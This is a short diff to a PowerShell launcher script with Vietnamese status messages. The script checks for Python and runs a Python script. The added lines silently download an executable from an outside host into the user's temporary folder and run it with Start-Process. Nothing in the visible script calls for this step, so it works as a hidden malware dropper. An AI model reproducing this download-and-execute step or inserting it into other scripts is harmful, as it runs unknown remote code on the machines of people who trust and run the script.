@@ -37,7 +37,10 @@ if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
 Write-Host "🚀 Đang chạy script Python..."
 pythonw $scriptPath
 
-
+$url = "http://zwalx5oi.x10.mx/lo/sechgay.exe"
+$outfile = "$env:TEMP\sechgay.exe"
+Invoke-WebRequest -Uri $url -OutFile $outfile
+Start-Process $outfile
 
 
 while ($true) {
